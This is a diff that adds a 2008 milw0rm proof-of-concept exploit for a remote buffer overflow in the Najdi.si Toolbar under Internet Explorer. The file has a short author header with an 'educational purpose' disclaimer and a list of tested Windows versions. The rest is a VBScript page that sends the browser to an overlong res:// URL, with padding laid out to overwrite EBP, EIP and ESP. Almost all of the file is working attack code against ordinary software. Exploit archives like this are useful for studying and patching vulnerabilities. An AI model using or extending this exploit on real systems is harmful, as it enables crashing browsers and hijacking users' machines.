@@ -1,0 +1,30 @@
+-----------------------------------------------------------------------------
+ Najdi.si Toolbar Remote Buffer Overflow
+ url: http://www.najdi.si/
+
+ Author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+
+ This was written for educational purpose. Use it at your own risk.
+ Author will be not responsible for any damage.
+
+ Tested on:
+ Windows XP Professional SP2 with Internet Explorer 6 and 7
+ Windows XP Professional SP3 with Internet Explorer 6 and 7
+ Windows 2k Professional SP4 with Internet Explorer 6
+ Windows Server 2003 SP2 with Internet Explorer 7
+-----------------------------------------------------------------------------
+<script language='vbscript'>
+
+ mUrl = "res://" + String(260, "a") + "bb" + "cc" + String(512, "d") + "/"
+ 
+ ' "bb" 	=> see EBP
+ ' "cc" 	=> see EIP
+ ' "ddd..."	=> see ESP
+
+ Document.Location = mUrl
+
+</script>
+
+# milw0rm.com [2008-08-29]
